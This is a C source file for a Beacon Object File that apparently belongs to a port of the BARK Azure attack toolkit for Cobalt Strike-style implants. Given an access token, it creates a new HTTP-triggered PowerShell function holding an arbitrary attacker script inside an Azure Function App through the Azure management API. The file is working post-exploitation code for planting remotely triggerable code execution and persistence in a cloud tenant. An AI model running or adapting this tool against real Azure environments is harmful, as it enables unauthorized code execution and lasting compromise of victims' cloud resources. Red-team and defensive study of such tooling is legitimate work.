/*
 * new_ps_function_app_function.c - BARK BOF
 * New-PowerShellFunctionAppFunction - Create a new PowerShell function in a Function App
 *
 * Args : token, pathToFunctionApp, functionName, powerShellScript
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[1024];
    char  *bodyBuf = NULL;
    LPWSTR widePath = NULL;
    char  *token = NULL, *funcAppPath = NULL, *funcName = NULL, *psScript = NULL;

    BeaconDataParse(&parser, args, alen);
    token       = BeaconDataExtract(&parser, NULL);
    funcAppPath = BeaconDataExtract(&parser, NULL);
    funcName    = BeaconDataExtract(&parser, NULL);
    psScript    = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_new_ps_function_app_function "
            "<token> <funcAppPath> <funcName> <psScript>\n");
        return;
    }

    bodyBuf = (char *)HAlloc(65536);
    if (!bodyBuf) { BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n"); return; }

    MSVCRT$sprintf_s(bodyBuf, 65536,
        "{\"id\":\"%s/functions/%s\","
        "\"properties\":{"
        "\"name\":\"%s\","
        "\"files\":{\"run.ps1\":\"%s\"},"
        "\"test_data\":\"test\","
        "\"config\":{\"bindings\":["
        "{\"authLevel\":\"function\",\"type\":\"httpTrigger\","
        "\"direction\":\"in\",\"name\":\"Request\","
        "\"methods\":[\"get\",\"post\"]},"
        "{\"type\":\"http\",\"direction\":\"out\",\"name\":\"Response\"}"
        "]}}}",
        funcAppPath, funcName, funcName, psScript);

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/functions/%s?api-version=2018-11-01", funcAppPath, funcName);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) {
        HFree(bodyBuf);
        BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] New-PowerShellFunctionAppFunction: %s\n", funcName);
    BarkPost(L"management.azure.com", widePath, L"PUT", bodyBuf, token, "application/json");
    HFree(widePath);
    HFree(bodyBuf);
}
